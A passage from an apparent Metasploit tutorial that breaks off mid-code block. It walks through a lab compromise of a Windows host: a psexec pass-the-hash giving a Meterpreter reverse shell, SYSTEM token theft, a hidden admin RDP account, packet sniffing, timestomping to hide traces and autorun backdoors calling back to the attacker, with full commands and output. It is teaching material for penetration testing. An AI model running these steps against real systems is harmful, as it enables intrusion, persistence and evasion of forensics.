</span><span class='line'>   ----                  ---------------                                                    --------  -----------
</span><span class='line'>   RHOST                 192.168.80.128                                                     yes       The target address
</span><span class='line'>   RPORT                 445                                                                yes       Set the SMB service port
</span><span class='line'>   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
</span><span class='line'>   SERVICE_DISPLAY_NAME                                                                     no        The service display name
</span><span class='line'>   SERVICE_NAME                                                                             no        The service name
</span><span class='line'>   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span><span class='line'>   SMBDomain             .                                                                  no        The Windows domain to use for authentication
</span><span class='line'>   SMBPass               aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  no        The password for the specified username
</span><span class='line'>   SMBUser               wingoat                                                            no        The username to authenticate as
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/x64/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...
</span><span class='line'>msf exploit(psexec) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:5555 
</span><span class='line'>[*] Connecting to the server...
</span><span class='line'>[*] Authenticating to 192.168.80.128:445 as user 'wingoat'...
</span><span class='line'>[*] Selecting PowerShell target
</span><span class='line'>[*] 192.168.80.128:445 - Executing the payload...
</span><span class='line'>[+] 192.168.80.128:445 - Service start timed out, OK if running a command or non-service executable...
</span><span class='line'>[*] Sending stage (1188911 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49177) at 2016-06-09 11:37:22 -0400</span></code></pre></td></tr></table></div></figure>


<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use incognito
</span><span class='line'>Loading extension incognito...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Incognito Commands
</span><span class='line'>==================
</span><span class='line'>
</span><span class='line'>    Command              Description
</span><span class='line'>    -------              -----------
</span><span class='line'>    add_group_user       Attempt to add a user to a global group with all tokens
</span><span class='line'>    add_localgroup_user  Attempt to add a user to a local group with all tokens
</span><span class='line'>    add_user             Attempt to add a user with all tokens
</span><span class='line'>    impersonate_token    Impersonate specified token
</span><span class='line'>    list_tokens          List tokens available under current user context
</span><span class='line'>    snarf_hashes         Snarf challenge/response hashes for every token</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what tokens are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; list_tokens
</span><span class='line'>Usage: list_tokens &lt;list_order_option&gt;
</span><span class='line'>
</span><span class='line'>Lists all accessible tokens and their privilege level
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -g        List tokens by unique groupname
</span><span class='line'>    -u        List tokens by unique username
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>meterpreter &gt; list_tokens -u
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>
</span><span class='line'>Delegation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\LOCAL SERVICE
</span><span class='line'>NT AUTHORITY\NETWORK SERVICE
</span><span class='line'>NT AUTHORITY\SYSTEM
</span><span class='line'>WIN-D7GA2J1M0TU\wingoat
</span><span class='line'>
</span><span class='line'>Impersonation Tokens Available
</span><span class='line'>========================================
</span><span class='line'>NT AUTHORITY\ANONYMOUS LOGON</span></code></pre></td></tr></table></div></figure>


<p>We are interested in the delegation tokens that are created by interactive logins. And among them..the SYSTEM token that we want!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; impersonate_token 
</span><span class='line'>Usage: impersonate_token &lt;token&gt;
</span><span class='line'>
</span><span class='line'>Instructs the meterpreter thread to impersonate the specified token. All other actions will then be made in the context of that token.
</span><span class='line'>
</span><span class='line'>Hint: Double backslash DOMAIN\\name (meterpreter quirk)
</span><span class='line'>Hint: Enclose with quotation marks if name contains a space
</span><span class='line'>
</span><span class='line'>meterpreter &gt; impersonate_token 'NT AUTHORITY\SYSTEM'
</span><span class='line'>[-] Warning: Not currently running as SYSTEM, not all tokens will be available
</span><span class='line'>             Call rev2self if primary process token is SYSTEM
</span><span class='line'>[+] Delegation token available
</span><span class='line'>[+] Successfully impersonated user NT AUTHORITY\SYSTEM
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>Server username: NT AUTHORITY\SYSTEM</span></code></pre></td></tr></table></div></figure>


<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui
</span><span class='line'>Windows Remote Desktop Enabler Meterpreter Script
</span><span class='line'>Usage: getgui -u &lt;username&gt; -p &lt;password&gt;
</span><span class='line'>Or:    getgui -e
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -e        Enable RDP only.
</span><span class='line'>    -f &lt;opt&gt;  Forward RDP Connection.
</span><span class='line'>    -h        Help menu.
</span><span class='line'>    -p &lt;opt&gt;  The Password of the user to add.
</span><span class='line'>    -u &lt;opt&gt;  The Username of the user to add.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run getgui -e
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Enabling Remote Desktop
</span><span class='line'>[*]   RDP is disabled; enabling it ...
</span><span class='line'>[*] Setting Terminal Services service startup mode
</span><span class='line'>[*]   The Terminal Services service is not set to auto, changing it to auto ...
</span><span class='line'>[*]   Opening port in local firewall if necessary
</span><span class='line'>[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2112.rc
</span><span class='line'>meterpreter &gt; run getgui -u master -p pwned
</span><span class='line'>[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
</span><span class='line'>[*] Carlos Perez carlos_perez@darkoperator.com
</span><span class='line'>[*] Setting user account for logon
</span><span class='line'>[*]   Adding User: master with Password: pwned
</span><span class='line'>[*]   Hiding user from Windows Login screen
</span><span class='line'>[*]   Adding User: master to local group 'Remote Desktop Users'
</span><span class='line'>[*]   Adding User: master to local group 'Administrators'
</span><span class='line'>[*] You can now login with the created user
</span><span class='line'>[*] For cleanup use command: run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc</span></code></pre></td></tr></table></div></figure>


<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~#rdesktop -u master -p pwned 192.168.80.128</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/rd.png" title="remote desktop" alt="remote desktop session on hacked machine"></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run multi_console_command -rc /root/.msf5/logs/scripts/getgui/clean_up__20160609.2308.rc
</span><span class='line'>[*] Running Command List ...
</span><span class='line'>[*]   Running command execute -H -f cmd.exe -a "/c net user master /delete"
</span><span class='line'>Process 832 created.
</span><span class='line'>[*]   Running command reg deleteval -k HKLM\\SOFTWARE\\Microsoft\\Windows\ NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -v master
</span><span class='line'>[-] stdapi_registry_open_key: Operation failed: The system cannot find the file specified.</span></code></pre></td></tr></table></div></figure>


<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; use sniffer
</span><span class='line'>Loading extension sniffer...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Sniffer Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command             Description
</span><span class='line'>    -------             -----------
</span><span class='line'>    sniffer_dump        Retrieve captured packet data to PCAP file
</span><span class='line'>    sniffer_interfaces  Enumerate all sniffable network interfaces
</span><span class='line'>    sniffer_release     Free captured packets on a specific interface instead of downloading them
</span><span class='line'>    sniffer_start       Start packet capture on a specific interface
</span><span class='line'>    sniffer_stats       View statistics of an active capture
</span><span class='line'>    sniffer_stop        Stop packet capture on a specific interface</span></code></pre></td></tr></table></div></figure>


<p>First, we must learn what network interfaces are available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_interfaces
</span><span class='line'>
</span><span class='line'>1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
</span><span class='line'>2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span></code></pre></td></tr></table></div></figure>


<p>Now we can start sniffing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_start 2
</span><span class='line'>[*] Capture started on interface 2 (50000 packet buffer)</span></code></pre></td></tr></table></div></figure>


<p>We can then dump the packets to a file and see if we&rsquo;ve got anything interesting:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sniffer_dump 2 /root/capture.pcap
</span><span class='line'>[*] Flushing packet capture buffer for interface 2...
</span><span class='line'>[*] Flushed 873 packets (756096 bytes)
</span><span class='line'>[*] Downloaded 069% (524288/756096)...
</span><span class='line'>[*] Downloaded 100% (756096/756096)...
</span><span class='line'>[*] Download completed, converting to PCAP...
</span><span class='line'>[*] PCAP file written to /root/capture.pcap</span></code></pre></td></tr></table></div></figure>


<h3>Modifying file attributes</h3>

<p>If you left traces on the filesystem, you can modify or erase file attributes to conceal your footprints:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; timestomp -h
</span><span class='line'>
</span><span class='line'>Usage: timestomp OPTIONS file_path
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -a &lt;opt&gt;  Set the "last accessed" time of the file
</span><span class='line'>    -b        Set the MACE timestamps so that EnCase shows blanks
</span><span class='line'>    -c &lt;opt&gt;  Set the "creation" time of the file
</span><span class='line'>    -e &lt;opt&gt;  Set the "mft entry modified" time of the file
</span><span class='line'>    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -m &lt;opt&gt;  Set the "last written" time of the file
</span><span class='line'>    -r        Set the MACE timestamps recursively on a directory
</span><span class='line'>    -v        Display the UTC MACE values of the file
</span><span class='line'>    -z &lt;opt&gt;  Set all four attributes (MACE) of the file</span></code></pre></td></tr></table></div></figure>


<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<h4>Metsvc</h4>

<p>This is how Metsvc looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run metsvc -h
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the service
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
</span><span class='line'>
</span><span class='line'>meterpreter &gt; run metsvc
</span><span class='line'>[*] Creating a meterpreter service on port 31337
</span><span class='line'>[*] Creating a temporary installation directory C:\Users\wingoat\AppData\Local\Temp\zMWkKgMkxJRdgpp...
</span><span class='line'>[*]  &gt;&gt; Uploading metsrv.x86.dll...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc-server.exe...
</span><span class='line'>[*]  &gt;&gt; Uploading metsvc.exe...
</span><span class='line'>[*] Starting the service...
</span><span class='line'>   * Installing service metsvc
</span><span class='line'> * Starting service
</span><span class='line'>Service metsvc successfully installed.</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, I couldn&rsquo;t connect to it because I got a bunch of SSL errors and I couldn&rsquo;t find any workaround.</p>

<h4>Persistence</h4>

<p>The Persistence script has more options:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -h
</span><span class='line'>Meterpreter Script for creating a persistent backdoor on a target host.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -A        Automatically start a matching exploit/multi/handler to connect to the agent
</span><span class='line'>    -L &lt;opt&gt;  Location in target host to write payload to, if none %TEMP% will be used.
</span><span class='line'>    -P &lt;opt&gt;  Payload to use, default is windows/meterpreter/reverse_tcp.
</span><span class='line'>    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
</span><span class='line'>    -T &lt;opt&gt;  Alternate executable template to use
</span><span class='line'>    -U        Automatically start the agent when the User logs on
</span><span class='line'>    -X        Automatically start the agent when the system boots
</span><span class='line'>    -h        This help menu
</span><span class='line'>    -i &lt;opt&gt;  The interval in seconds between each connection attempt
</span><span class='line'>    -p &lt;opt&gt;  The port on which the system running Metasploit is listening
</span><span class='line'>    -r &lt;opt&gt;  The IP of the system running Metasploit listening for the connect back</span></code></pre></td></tr></table></div></figure>


<p>First, we set our listener:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>PAYLOAD =&gt; windows/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(handler) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/handler):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (windows/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
</span><span class='line'>   LHOST     192.168.80.155   yes       The listen address
</span><span class='line'>   LPORT     5555             yes       The listen port
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Then on the target machine we install the backdoor and it connects back to us!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; run persistence -U -i 5 -p 5555 -r 192.168.80.155
</span><span class='line'>[*] Running Persistance Script
</span><span class='line'>[*] Resource file for cleanup created at /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.5432/WIN-D7GA2J1M0TU_20160610.5432.rc
</span><span class='line'>[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.80.155 LPORT=5555
</span><span class='line'>[*] Persistent agent script is 148445 bytes long
</span><span class='line'>[+] Persistent Script written to C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
</span><span class='line'>[*] Executing script C:\Users\wingoat\AppData\Local\Temp\PxRekDybzCP.vbs
</span><span class='line'>[+] Agent executed with PID 2720
</span><span class='line'>[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VNYLJOXnjCVb
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[*] Sending stage (957487 bytes) to 192.168.80.128
</span><span class='line'>[*] Meterpreter session 4 opened (192.168.80.155:5555 -&gt; 192.168.80.128:49172) at 2016-06-10 13:54:36 -0400</span></code></pre></td></tr></table></div></figure>


<p>When done, don&rsquo;t forget the cleanup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; resource /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Reading /root/.msf5/logs/persistence/WIN-D7GA2J1M0TU_20160610.0141/WIN-D7GA2J1M0TU_20160610.0141.rc
</span><span class='line'>[*] Running rm C://Users//wingoat//AppData//Local//Temp//cIABjXRUXdyyr.vbs
</span><span class='line'>
</span><span class='line'>[*] Running reg deleteval -k 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' -v IbLYzVxLgKX
</span><span class='line'>
</span><span class='line'>Successfully deleted IbLYzVxLgKX.</span></code></pre></td></tr></table></div></figure>


<h2>Python extensions</h2>

<p>For us Python coders out there, Meterpreter has a nice Python extension that can allow us to run Python code without it being installed on the target machine</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; load python
</span><span class='line'>Loading extension python...success.
</span><span class='line'>meterpreter &gt; help
</span><span class='line'>...
</span><span class='line'>Python Commands
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>    Command         Description
</span><span class='line'>    -------         -----------
</span><span class='line'>    python_execute  Execute a python command string
</span><span class='line'>    python_import   Import/run a python file or module
</span><span class='line'>    python_reset    Resets/restarts the Python interpreter</span></code></pre></td></tr></table></div></figure>


<h1>Vulnerability scanning</h1>

<p>For web application assessments, Metasploit has a built-in web app scanner called WMAP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; load wmap
</span><span class='line'>
</span><span class='line'>.-.-.-..-.-.-..---..---.
</span><span class='line'>| | | || | | || | || |-'
</span><span class='line'>`-----'`-'-'-'`-^-'`-'
</span><span class='line'>[WMAP 1.5.1] ===  et [  ] metasploit.com 2012
</span><span class='line'>[*] Successfully loaded plugin: wmap
</span><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>wmap Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    wmap_modules  Manage wmap modules
</span><span class='line'>    wmap_nodes    Manage nodes
</span><span class='line'>    wmap_run      Test targets
</span><span class='line'>    wmap_sites    Manage sites
</span><span class='line'>    wmap_targets  Manage targets
</span><span class='line'>    wmap_vulns    Display web vulns
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>First you have to add a site:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_sites -h
</span><span class='line'>[*] Usage: wmap_sites [options]
</span><span class='line'>  -h        Display this help text
</span><span class='line'>  -a [url]  Add site (vhost,url)
</span><span class='line'>  -d [ids]  Delete sites (separate ids with space)
</span><span class='line'>  -l        List all available sites
</span><span class='line'>  -s [id]   Display site structure (vhost,url|ids) (level)
</span><span class='line'>msf &gt; wmap_sites -a http://192.168.80.157/
</span><span class='line'>[*] Site created.
</span></code></pre></td></tr></table></div></figure>


<p>Then you specify the added site as a target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; wmap_targets -h
</span><span class='line'>[*] Usage: wmap_targets [options]
</span><span class='line'>  -h      Display this help text
</span><span class='line'>  -t [urls]   Define target sites (vhost1,url[space]vhost2,url) 
</span><span class='line'>  -d [ids]    Define target sites (id1, id2, id3 ...)
</span><span class='line'>  -c      Clean target sites list
</span><span class='line'>  -l          List all target sites
</span><span class='line'>msf &gt; wmap_targets -t http://192.168.80.157/</span></code></pre></td></tr></table></div></figure>


<p>Before scanning you might want to take a look at the enabled modules:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
